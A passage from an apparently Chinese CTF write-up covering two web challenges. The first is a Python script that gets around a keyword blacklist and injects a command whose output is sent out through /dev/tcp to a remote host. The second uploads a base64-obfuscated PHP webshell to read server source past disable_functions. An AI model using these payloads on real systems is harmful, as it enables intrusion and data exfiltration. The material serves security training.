punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'eval'</span><span class="token punctuation">,</span><span class="token string">'if'</span><span class="token punctuation">,</span><span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'open'</span><span class="token punctuation">,</span><span class="token string">'popen'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span><span class="token punctuation">,</span><span class="token string">'compile'</span><span class="token punctuation">,</span><span class="token string">'execfile'</span><span class="token punctuation">,</span><span class="token string">'from_pyfile'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'local'</span><span class="token punctuation">,</span><span class="token string">'self'</span><span class="token punctuation">,</span><span class="token string">'item'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'getattribute'</span><span class="token punctuation">,</span><span class="token string">'func_globals'</span><span class="token punctuation">,</span><span class="token string">'__init__'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'__dict__'</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> no <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> no<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>no<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> flag<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    cmd<span class="token operator">=</span><span class="token string">"ls"</span>    cmd<span class="token operator">=</span>cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">)</span>    num<span class="token operator">=</span>f<span class="token string">"1#`{cmd}`>/dev/tcp/ip/port&lt;"</span>    <span class="token comment" spellcheck="true">#ip="192.168.0.1"</span>    <span class="token comment" spellcheck="true">#log = "echo {0} {1} {2}> ./tmp/log.txt".format(time.strftime("%Y%m%d-%H%M%S", time.localtime()), ip, num)</span>    <span class="token comment" spellcheck="true">#print(log)</span>    num<span class="token operator">=</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>num<span class="token punctuation">)</span>    url<span class="token operator">=</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/calc?num=%s"</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(url)</span></code></pre><p>其中log为</p><pre class=" language-1"><code class="language-1">echo 20220405-120804 192.168.0.1 1#`ls`>/dev/tcp/ip/port<> ./tmp/log.txt</code></pre><p>构造的payload中的&lt;是为了闭合后面的&gt;重定向。<br>发包后监听可得到</p><pre class=" language-1"><code class="language-1">Th1s_is\_\_F1114g bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</code></pre><p>猜测在Th1s_is__F1114g中，但_在WAF中被过滤，于是可以利用通配符，将命令换为cat /*。<br>得到flag。</p><h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p>进入题目环境，是一个文件上传题目，尝试上传，发现存在WAF而且只能上传php文件，尝试上传</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p>访问发现，php是8.0.1版本，同时还有一堆disable_functions</p><pre class=" language-1"><code class="language-1">zend_version, func_num_args, func_get_arg, func_get_args, strcmp, strncmp, strcasecmp, strncasecmp, each, error_log, defined, get_class, get_called_class, get_parent_class, method_exists, property_exists, class_exists, interface_exists, trait_exists, function_exists, class_alias, get_included_files, get_required_files, is_subclass_of, is_a, get_class_vars, get_object_vars, get_mangled_object_vars, get_class_methods, trigger_error, user_error, restore_error_handler, set_exception_handler, restore_exception_handler, get_declared_classes, get_declared_traits, get_declared_interfaces, get_defined_functions, get_defined_vars, create_function, get_resource_type, get_resources, get_loaded_extensions, extension_loaded, get_extension_funcs, get_defined_constants, debug_backtrace, debug_print_backtrace, gc_mem_caches, gc_collect_cycles, gc_enabled, gc_enable, gc_disable, gc_status, strtotime, date, idate, gmdate, mktime, gmmktime, checkdate, strftime, gmstrftime, time, localtime, getdate, date_create, date_create_immutable, date_create_from_format, date_create_immutable_from_format, date_parse, date_parse_from_format, date_get_last_errors, date_format, date_modify, date_add, date_sub, date_timezone_get, date_timezone_set, date_offset_get, date_diff, date_time_set, date_date_set, date_isodate_set, date_timestamp_set, date_timestamp_get, timezone_open, timezone_name_get, timezone_name_from_abbr, timezone_offset_get, timezone_transitions_get, timezone_location_get, timezone_identifiers_list, timezone_abbreviations_list, timezone_version_get, date_interval_create_from_date_string, date_interval_format, date_default_timezone_set, date_default_timezone_get, date_sunrise, date_sunset, date_sun_info, libxml_set_streams_context, libxml_use_internal_errors, libxml_get_last_error, libxml_clear_errors, libxml_get_errors, libxml_disable_entity_loader, libxml_set_external_entity_loader, openssl_get_cert_locations, openssl_spki_new, openssl_spki_verify, openssl_spki_export, openssl_spki_export_challenge, openssl_pkey_free, openssl_pkey_new, openssl_pkey_export, openssl_pkey_export_to_file, openssl_pkey_get_private, openssl_pkey_get_public, openssl_pkey_get_details, openssl_free_key, openssl_get_privatekey, openssl_get_publickey, openssl_x509_read, openssl_x509_free, openssl_x509_parse, openssl_x509_checkpurpose, openssl_x509_check_private_key, openssl_x509_verify, openssl_x509_export, openssl_x509_fingerprint, openssl_x509_export_to_file, openssl_pkcs12_export, openssl_pkcs12_export_to_file, openssl_pkcs12_read, openssl_csr_new, openssl_csr_export, openssl_csr_export_to_file, openssl_csr_sign, openssl_csr_get_subject, openssl_csr_get_public_key, openssl_digest, openssl_encrypt, openssl_decrypt, openssl_cipher_iv_length, openssl_sign, openssl_verify, openssl_seal, openssl_open, openssl_pbkdf2, openssl_pkcs7_verify, openssl_pkcs7_decrypt, openssl_pkcs7_sign, openssl_pkcs7_encrypt, openssl_pkcs7_read, openssl_private_encrypt, openssl_private_decrypt, openssl_public_encrypt, openssl_public_decrypt, openssl_get_md_methods, openssl_get_cipher_methods, openssl_get_curve_names, openssl_dh_compute_key, openssl_pkey_derive, openssl_random_pseudo_bytes, openssl_error_string, preg_match_all, preg_replace, preg_replace_callback, preg_replace_callback_array, preg_filter, preg_split, preg_quote, preg_grep, preg_last_error, readgzfile, gzrewind, gzclose, gzeof, gzgetc, gzgets, gzgetss, gzread, gzopen, gzpassthru, gzseek, gztell, gzwrite, gzputs, gzfile, gzcompress, gzuncompress, gzdeflate, gzinflate, gzencode, gzdecode, zlib_encode, zlib_decode, zlib_get_coding_type, deflate_init, deflate_add, inflate_init, inflate_add, inflate_get_status, inflate_get_read_len, ob_gzhandler, filter_input, filter_var, filter_input_array, filter_var_array, filter_list, filter_has_var, filter_id, hash, hash_file, hash_hmac, hash_hmac_file, hash_init, hash_update, hash_update_stream, hash_update_file, hash_final, hash_copy, hash_algos, hash_hmac_algos, hash_pbkdf2, hash_equals, hash_hkdf, mhash_keygen_s2k, mhash_get_block_size, mhash_get_hash_name, mhash_count, mhash, session_name, session_module_name, session_save_path, session_id, session_create_id, session_regenerate_id, session_decode, session_encode, session_start, session_destroy, session_unset, session_gc, session_set_save_handler, session_cache_limiter, session_cache_expire, session_set_cookie_params, session_get_cookie_params, session_write_close, session_abort, session_reset, session_status, session_register_shutdown, session_commit, sodium_crypto_aead_aes256gcm_is_available, sodium_crypto_aead_aes256gcm_decrypt, sodium_crypto_aead_aes256gcm_encrypt, sodium_crypto_aead_aes256gcm_keygen, sodium_crypto_aead_chacha20poly1305_decrypt, sodium_crypto_aead_chacha20poly1305_encrypt, sodium_crypto_aead_chacha20poly1305_keygen, sodium_crypto_aead_chacha20poly1305_ietf_decrypt, sodium_crypto_aead_chacha20poly1305_ietf_encrypt, sodium_crypto_aead_chacha20poly1305_ietf_keygen, sodium_crypto_aead_xchacha20poly1305_ietf_decrypt, sodium_crypto_aead_xchacha20poly1305_ietf_keygen, sodium_crypto_aead_xchacha20poly1305_ietf_encrypt, sodium_crypto_auth, sodium_crypto_auth_keygen, sodium_crypto_auth_verify, sodium_crypto_box, sodium_crypto_box_keypair, sodium_crypto_box_seed_keypair, sodium_crypto_box_keypair_from_secretkey_and_publickey, sodium_crypto_box_open, sodium_crypto_box_publickey, sodium_crypto_box_publickey_from_secretkey, sodium_crypto_box_seal, sodium_crypto_box_seal_open, sodium_crypto_box_secretkey, sodium_crypto_kx_keypair, sodium_crypto_kx_publickey, sodium_crypto_kx_secretkey, sodium_crypto_kx_seed_keypair, sodium_crypto_kx_client_session_keys, sodium_crypto_kx_server_session_keys, sodium_crypto_generichash, sodium_crypto_generichash_keygen, sodium_crypto_generichash_init, sodium_crypto_generichash_update, sodium_crypto_generichash_final, sodium_crypto_kdf_derive_from_key, sodium_crypto_kdf_keygen, sodium_crypto_pwhash, sodium_crypto_pwhash_str, sodium_crypto_pwhash_str_verify, sodium_crypto_pwhash_str_needs_rehash, sodium_crypto_pwhash_scryptsalsa208sha256, sodium_crypto_pwhash_scryptsalsa208sha256_str, sodium_crypto_pwhash_scryptsalsa208sha256_str_verify, sodium_crypto_scalarmult, sodium_crypto_secretbox, sodium_crypto_secretbox_keygen, sodium_crypto_secretbox_open, sodium_crypto_secretstream_xchacha20poly1305_keygen, sodium_crypto_secretstream_xchacha20poly1305_init_push, sodium_crypto_secretstream_xchacha20poly1305_push, sodium_crypto_secretstream_xchacha20poly1305_init_pull, sodium_crypto_secretstream_xchacha20poly1305_pull, sodium_crypto_secretstream_xchacha20poly1305_rekey, sodium_crypto_shorthash, sodium_crypto_shorthash_keygen, sodium_crypto_sign, sodium_crypto_sign_detached, sodium_crypto_sign_ed25519_pk_to_curve25519, sodium_crypto_sign_ed25519_sk_to_curve25519, sodium_crypto_sign_keypair, sodium_crypto_sign_keypair_from_secretkey_and_publickey, sodium_crypto_sign_open, sodium_crypto_sign_publickey, sodium_crypto_sign_secretkey, sodium_crypto_sign_publickey_from_secretkey, sodium_crypto_sign_seed_keypair, sodium_crypto_sign_verify_detached, sodium_crypto_stream, sodium_crypto_stream_keygen, sodium_crypto_stream_xor, sodium_add, sodium_compare, sodium_increment, sodium_memcmp, sodium_memzero, sodium_pad, sodium_unpad, sodium_bin2hex, sodium_hex2bin, sodium_bin2base64, sodium_base642bin, sodium_crypto_scalarmult_base, spl_classes, spl_autoload, spl_autoload_extensions, spl_autoload_register, spl_autoload_unregister, spl_autoload_functions, spl_autoload_call, class_parents, class_implements, class_uses, spl_object_hash, spl_object_id, iterator_to_array, iterator_count, iterator_apply, constant, bin2hex, hex2bin, sleep, usleep, time_nanosleep, time_sleep_until, strptime, flush, wordwrap, htmlspecialchars, htmlentities, html_entity_decode, htmlspecialchars_decode, get_html_translation_table, sha1, sha1_file, md5_file, crc32, iptcparse, iptcembed, getimagesize, getimagesizefromstring, image_type_to_mime_type, image_type_to_extension, phpversion, phpcredits, php_sapi_name, php_uname, php_ini_scanned_files, php_ini_loaded_file, strnatcmp, strnatcasecmp, substr_count, strspn, strcspn, strtok, strtoupper, ini_set, strpos, stripos, strrpos, strripos, strrev, hebrev, hebrevc, nl2br, basename, dirname, stripslashes, stripcslashes, stristr, strrchr, str_shuffle, str_word_count, str_split, strpbrk, substr_compare, utf8_encode, utf8_decode, strcoll, money_format, substr, substr_replace, quotemeta, ucfirst, lcfirst, ucwords, strtr, addslashes, addcslashes, rtrim, str_replace, str_ireplace, str_repeat, count_chars, chunk_split, trim, ltrim, strip_tags, similar_text, explode, implode, join, setlocale, localeconv, nl_langinfo, soundex, levenshtein, chr, ord, parse_str, str_getcsv, str_pad, chop, strchr, sprintf, printf, vprintf, vsprintf, fprintf, vfprintf, sscanf, fscanf, parse_url, urlencode, urldecode, rawurlencode, rawurldecode, http_build_query, readlink, linkinfo, symlink, link, unlink, exec, system, escapeshellcmd, passthru, shell_exec, proc_open, proc_close, proc_terminate, proc_get_status, proc_nice, rand, srand, getrandmax, mt_rand, mt_srand, mt_getrandmax, random_bytes, random_int, getservbyname, getservbyport, getprotobyname, getprotobynumber, getmyuid, getmygid, getmypid, getmyinode, getlastmod, password_hash, password_get_info, password_needs_rehash, password_verify, password_algos, convert_uuencode, convert_uudecode, abs, ceil, floor, round, sin, cos, tan, asin, acos, atan, atanh, atan2, sinh, cosh, tanh, asinh, acosh, expm1, log1p, pi, is_finite, is_nan, is_infinite, pow, exp, log, log10, sqrt, hypot, deg2rad, rad2deg, bindec, hexdec, octdec, decbin, decoct, dechex, base_convert, number_format, fmod, intdiv, inet_ntop, inet_pton, ip2long, long2ip, getenv, getopt, sys_getloadavg, microtime, gettimeofday, getrusage, hrtime, uniqid, quoted_printable_decode, quoted_printable_encode, convert_cyr_string, get_current_user, set_time_limit, header_register_callback, get_cfg_var, get_magic_quotes_gpc, get_magic_quotes_runtime, error_get_last, error_clear_last, call_user_func, call_user_func_array, forward_static_call, forward_static_call_array, serialize, unserialize, var_dump, var_export, debug_zval_dump, print_r, memory_get_usage, memory_get_peak_usage, register_shutdown_function, register_tick_function, unregister_tick_function, highlight_file, highlight_string, php_strip_whitespace, ini_get, ini_get_all, ini_alter, ini_restore, get_include_path, set_include_path, restore_include_path, setcookie, setrawcookie, header, header_remove, headers_sent, headers_list, http_response_code, connection_aborted, connection_status, ignore_user_abort, parse_ini_file, parse_ini_string, is_uploaded_file, gethostbyaddr, gethostbyname, gethostbynamel, gethostname, net_get_interfaces, dns_check_record, checkdnsrr, dns_get_mx, getmxrr, dns_get_record, intval, floatval, doubleval, strval, boolval, gettype, settype, is_null, is_resource, is_bool, is_int, is_float, is_integer, is_long, is_double, is_real, is_numeric, is_string, is_array, is_object, is_scalar, is_callable, is_iterable, is_countable, pclose, popen, readfile, rewind, rmdir, umask, fclose, feof, fgetc, fgets, fgetss, fread, fopen, fpassthru, ftruncate, fstat, fseek, ftell, fflush, fwrite, fputs, mkdir, rename, copy, tempnam, tmpfile, file, file_put_contents, stream_select, stream_context_create, stream_context_set_params, stream_context_get_params, stream_context_set_option, stream_context_get_options, stream_context_get_default, stream_context_set_default, stream_filter_prepend, stream_filter_append, stream_filter_remove, stream_socket_client, stream_socket_server, stream_socket_accept, stream_socket_get_name, stream_socket_recvfrom, stream_socket_sendto, stream_socket_enable_crypto, stream_socket_shutdown, stream_socket_pair, stream_copy_to_stream, stream_get_contents, stream_supports_lock, stream_isatty, fgetcsv, fputcsv, flock, get_meta_tags, stream_set_read_buffer, stream_set_write_buffer, set_file_buffer, stream_set_chunk_size, stream_set_blocking, socket_set_blocking, stream_get_meta_data, stream_get_line, stream_wrapper_register, stream_register_wrapper, stream_wrapper_unregister, stream_wrapper_restore, stream_get_wrappers, stream_get_transports, stream_resolve_include_path, stream_is_local, get_headers, stream_set_timeout, socket_set_timeout, socket_get_status, realpath, fnmatch, fsockopen, pfsockopen, pack, unpack, get_browser, crypt, opendir, closedir, chdir, getcwd, rewinddir, readdir, dir, scandir, glob, fileatime, filectime, filegroup, fileinode, filemtime, fileowner, fileperms, filesize, filetype, file_exists, is_writable, is_writeable, is_readable, is_executable, is_file, is_dir, is_link, stat, lstat, chown, chgrp, lchown, lchgrp, chmod, touch, clearstatcache, disk_total_space, disk_free_space, diskfreespace, realpath_cache_size, realpath_cache_get, ezmlm_hash, openlog, syslog, closelog, lcg_value, metaphone, ob_start, ob_flush, ob_clean, ob_end_flush, ob_end_clean, ob_get_flush, ob_get_clean, ob_get_length, ob_get_level, ob_get_status, ob_get_contents, ob_implicit_flush, ob_list_handlers, ksort, krsort, natsort, natcasesort, asort, arsort, sort, rsort, usort, uasort, uksort, shuffle, array_walk, array_walk_recursive, count, end, prev, next, reset, current, key, min, max, in_array, array_search, extract, compact, array_fill, array_fill_keys, range, array_multisort, array_push, array_pop, array_shift, array_unshift, array_splice, array_slice, array_merge, array_merge_recursive, array_replace, array_replace_recursive, array_keys, array_key_first, array_key_last, array_values, array_count_values, array_column, array_reverse, array_reduce, array_pad, array_flip, array_change_key_case, array_rand, array_unique, array_intersect, array_intersect_key, array_intersect_ukey, array_uintersect, array_intersect_assoc, array_uintersect_assoc, array_intersect_uassoc, array_uintersect_uassoc, array_diff, array_diff_key, array_diff_ukey, array_udiff, array_diff_assoc, array_udiff_assoc, array_diff_uassoc, array_udiff_uassoc, array_sum, array_product, array_filter, array_map, array_chunk, array_combine, array_key_exists, pos, sizeof, key_exists, assert, assert_options, version_compare, ftok, str_rot13, stream_get_filters, stream_filter_register, stream_bucket_make_writeable, stream_bucket_prepend, stream_bucket_append, stream_bucket_new, output_add_rewrite_var, output_reset_rewrite_vars, sys_get_temp_dir, apache_lookup_uri, virtual, apache_request_headers, apache_response_headers, apache_getenv, apache_note, apache_get_version, apache_get_modules, getallheaders, xxhash32, xxhash64, pdo_drivers, xml_parser_create, xml_parser_create_ns, xml_set_object, xml_set_element_handler, xml_set_character_data_handler, xml_set_processing_instruction_handler, xml_set_default_handler, xml_set_unparsed_entity_decl_handler, xml_set_notation_decl_handler, xml_set_external_entity_ref_handler, xml_set_start_namespace_decl_handler, xml_set_end_namespace_decl_handler, xml_parse, xml_parse_into_struct, xml_get_error_code, xml_error_string, xml_get_current_line_number, xml_get_current_column_number, xml_get_current_byte_index, xml_parser_free, xml_parser_set_option, xml_parser_get_option, jdtogregorian, gregoriantojd, jdtojulian, juliantojd, jdtojewish, jewishtojd, jdtofrench, gmp_prob_prime, gmp_gcd, gmp_gcdext, gmp_lcm, gmp_invert, gmp_jacobi, gmp_legendre, gmp_kronecker, gmp_cmp, gmp_sign, gmp_random, gmp_random_seed, gmp_random_bits, gmp_random_range, gmp_and, gmp_or, gmp_com, gmp_xor, gmp_setbit, gmp_clrbit, gmp_testbit, gmp_scan0, gmp_scan1, gmp_popcount, gmp_hamdist, gmp_nextprime, gmp_binomial, iconv, iconv_get_encoding, iconv_set_encoding, iconv_strlen, iconv_substr, iconv_strpos, iconv_strrpos, iconv_mime_encode, iconv_mime_decode, iconv_mime_decode_headers, json_encode, json_decode, json_last_error, json_last_error_msg, mb_convert_case, mb_strtoupper, mb_strtolower, mb_language, mb_internal_encoding, mb_http_input, mb_http_output, mb_detect_order, mb_substitute_character, mb_parse_str, mb_output_handler, mb_preferred_mime_name, mb_str_split, mb_strlen, mb_strpos, mb_strrpos, mb_stripos, mb_strripos, mb_strstr, mb_strrchr, mb_stristr, mb_strrichr, mb_substr_count, mb_substr, mb_strcut, mb_strwidth, mb_strimwidth, mb_convert_encoding, mb_detect_encoding, mb_list_encodings, mb_encoding_aliases, mb_convert_kana, mb_encode_mimeheader, mb_decode_mimeheader, mb_convert_variables, mb_encode_numericentity, mb_decode_numericentity, mb_send_mail, mb_get_info, mb_check_encoding, mb_ord, mb_chr, mb_scrub, mb_regex_encoding, mb_regex_set_options, mb_ereg, mb_eregi, mb_ereg_replace, mb_eregi_replace, mb_ereg_replace_callback, mb_split, mb_ereg_match, mb_ereg_search, mb_ereg_search_pos, mb_ereg_search_regs, mb_ereg_search_init, mb_ereg_search_getregs, mb_ereg_search_getpos, mb_ereg_search_setpos, mbregex_encoding, mbereg, mberegi, mbereg_replace, mberegi_replace, mbsplit, mbereg_match, mbereg_search, mbereg_search_pos, mbereg_search_regs, mbereg_search_init, mbereg_search_getregs, mbereg_search_getpos, mbereg_search_setpos, mysqli_affected_rows, mysqli_autocommit, mysqli_begin_transaction, mysqli_change_user, mysqli_character_set_name, mysqli_close, mysqli_commit, mysqli_connect, mysqli_connect_errno, mysqli_connect_error, mysqli_data_seek, mysqli_dump_debug_info, mysqli_debug, mysqli_errno, mysqli_error, mysqli_error_list, mysqli_stmt_execute, mysqli_execute, mysqli_fetch_field, mysqli_fetch_fields, mysqli_fetch_field_direct, mysqli_fetch_lengths, mysqli_fetch_all, mysqli_fetch_array, mysqli_fetch_assoc, mysqli_fetch_object, mysqli_fetch_row, mysqli_field_count, mysqli_field_seek, mysqli_field_tell, mysqli_free_result, mysqli_get_connection_stats, mysqli_get_client_stats, mysqli_get_charset, mysqli_get_client_info, mysqli_get_client_version, mysqli_get_links_stats, mysqli_get_host_info, mysqli_get_proto_info, mysqli_get_server_info, mysqli_get_server_version, mysqli_get_warnings, mysqli_init, mysqli_info, mysqli_insert_id, mysqli_kill, mysqli_more_results, mysqli_multi_query, mysqli_next_result, mysqli_num_fields, mysqli_num_rows, mysqli_options, mysqli_ping, mysqli_poll, mysqli_prepare, mysqli_report, mysqli_query, mysqli_real_connect, mysqli_real_escape_string, mysqli_real_query, mysqli_reap_async_query, mysqli_release_savepoint, mysqli_rollback, mysqli_savepoint, mysqli_select_db, mysqli_set_charset, mysqli_stmt_affected_rows, mysqli_stmt_attr_get, mysqli_stmt_attr_set, mysqli_stmt_bind_param, mysqli_stmt_bind_result, mysqli_stmt_close, mysqli_stmt_data_seek, mysqli_stmt_errno, mysqli_stmt_error, mysqli_stmt_error_list, mysqli_stmt_fetch, mysqli_stmt_field_count, mysqli_stmt_free_result, mysqli_stmt_get_result, mysqli_stmt_get_warnings, mysqli_stmt_init, mysqli_stmt_insert_id, mysqli_stmt_more_results, mysqli_stmt_next_result, mysqli_stmt_num_rows, mysqli_stmt_param_count, mysqli_stmt_prepare, mysqli_stmt_reset, mysqli_stmt_result_metadata, mysqli_stmt_send_long_data, mysqli_stmt_store_result, mysqli_stmt_sqlstate, mysqli_sqlstate, mysqli_ssl_set, mysqli_stat, mysqli_store_result, mysqli_thread_id, mysqli_thread_safe, mysqli_use_result, mysqli_warning_count, mysqli_refresh, mysqli_escape_string, mysqli_set_opt, posix_kill, posix_getpid, posix_getppid, posix_getuid, posix_setuid, posix_geteuid, posix_seteuid, posix_getgid, posix_setgid, posix_getegid, posix_setegid, posix_getgroups, posix_getlogin, posix_getpgrp, posix_setsid, posix_setpgid, posix_getpgid, posix_getsid, posix_uname, posix_times, posix_ctermid, posix_ttyname, posix_isatty, posix_getcwd, posix_mkfifo, posix_mknod, posix_access, posix_getgrnam, posix_getgrgid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_setrlimit, posix_get_last_error, posix_errno, posix_strerror, posix_initgroups, readline, readline_info, readline_add_history, readline_clear_history, readline_list_history, readline_read_history, readline_write_history, readline_completion_function, readline_callback_handler_install, readline_callback_read_char, readline_callback_handler_remove, readline_redisplay, readline_on_new_line, shmop_open, shmop_read, shmop_close, shmop_size, shmop_write, shmop_delete, simplexml_load_file, simplexml_load_string, simplexml_import_dom, socket_select, socket_create, socket_create_listen, socket_create_pair, socket_accept, socket_set_nonblock, socket_set_block, socket_listen, socket_close, socket_write, socket_read, socket_getsockname, socket_getpeername, socket_connect, socket_strerror, socket_bind, socket_recv, socket_send, socket_recvfrom, socket_sendto, socket_get_option, socket_set_option, socket_shutdown, socket_last_error, socket_clear_error, socket_import_stream, socket_export_stream, socket_sendmsg, socket_recvmsg, socket_cmsg_space, socket_addrinfo_lookup, socket_addrinfo_connect, socket_addrinfo_bind, socket_addrinfo_explain, socket_getopt, socket_setopt, msg_get_queue, msg_send, msg_receive, msg_remove_queue, msg_stat_queue, msg_set_queue, msg_queue_exists, sem_get, sem_acquire, sem_release, sem_remove, shm_attach, shm_remove, shm_detach, shm_put_var, shm_has_var, shm_get_var, shm_remove_var, token_get_all, token_name, xmlwriter_open_uri, xmlwriter_open_memory, xmlwriter_set_indent, xmlwriter_set_indent_string, xmlwriter_start_comment, xmlwriter_end_comment, xmlwriter_start_attribute, xmlwriter_end_attribute, xmlwriter_write_attribute, xmlwriter_start_attribute_ns, xmlwriter_write_attribute_ns, xmlwriter_start_element, xmlwriter_end_element, xmlwriter_full_end_element, xmlwriter_start_element_ns, xmlwriter_write_element, xmlwriter_write_element_ns, xmlwriter_start_pi, xmlwriter_end_pi, xmlwriter_write_pi, xmlwriter_start_cdata, xmlwriter_end_cdata, xmlwriter_write_cdata, xmlwriter_text, xmlwriter_write_raw, xmlwriter_start_document, xmlwriter_end_document, xmlwriter_write_comment, xmlwriter_start_dtd, xmlwriter_end_dtd, xmlwriter_write_dtd, xmlwriter_start_dtd_element, xmlwriter_end_dtd_element, xmlwriter_write_dtd_element, xmlwriter_start_dtd_attlist, xmlwriter_end_dtd_attlist, xmlwriter_write_dtd_attlist, xmlwriter_start_dtd_entity, xmlwriter_end_dtd_entity, xmlwriter_write_dtd_entity, xmlwriter_output_memory, xmlwriter_flush, zip_open, zip_close, zip_read, zip_entry_open, zip_entry_close, zip_entry_read, zip_entry_filesize, zip_entry_name, zip_entry_compressedsize, zip_entry_compressionmethod, opcache_reset, opcache_invalidate, opcache_compile_file, opcache_is_script_cached, opcache_get_configuration, opcache_get_status,</code></pre><p>尝试用 show_source 函数读取 index.php ，不过有 WAF 做了过滤，发现base64并没有被过滤，于是用base64进行修饰绕过 base64_decode(“c2hvd19zb3VyY2U=”)，传马</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string">'c2hvd19zb3VyY2U='</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>读取到</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>glow<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>return checkFile()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    嘿伙计，传个火？！    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>input_file<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload_file<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>flare<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"\$_"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span><span class="token string">"copy"</span> <span class="token punctuation">,</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token string">"usort"</span><span class="token punctuation">,</span><span class="token string">"include"</span><span class="token punctuation">,</span> <span class="token string">"require"</span><span class="token punctuation">,</span> <span class="token 